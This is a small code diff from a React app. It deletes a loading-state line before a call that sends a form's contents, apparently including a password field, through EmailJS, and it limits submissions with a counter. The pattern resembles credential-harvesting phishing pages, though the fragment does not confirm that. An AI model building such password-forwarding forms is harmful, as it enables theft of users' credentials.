@@ -43,8 +43,6 @@ function App() {
 
     if (count < 2) {
       setCount(prevCount => prevCount + 1)
-
-      setLoading(true)
       emailjs.sendForm('service_yhntau9', 'template_omqihka', form.current, 'PGH4OIS-XQr7cngOw')
       .then((result) => {
         setPwdOne("")
